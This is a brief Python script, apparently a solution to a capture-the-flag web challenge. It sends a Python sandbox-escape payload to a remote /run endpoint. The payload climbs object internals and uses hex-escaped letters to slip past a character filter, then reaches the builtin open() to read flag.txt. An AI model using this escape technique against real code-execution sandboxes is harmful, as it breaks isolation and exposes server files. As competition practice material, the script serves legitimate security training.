import requests

base = "http://localhost:3000"
base = "https://farquaad.chall.lac.tf/"
url = lambda end: f"{base.rstrip('/')}{end}"

# below payload can be typed into web interface
payload = r"""
(o := ().__class__.__mro__[1], g := o.__dict__["__g\x65tattribut\x65__"], g(g(o, "__subclass\x65s__")()[138].__init__.__builtins__["op\x65n"]("flag.txt"), "r\x65ad")())[-1]
""".strip()

r = requests.post(url("/run"), json={"code": payload})
print(r.json()["msg"])
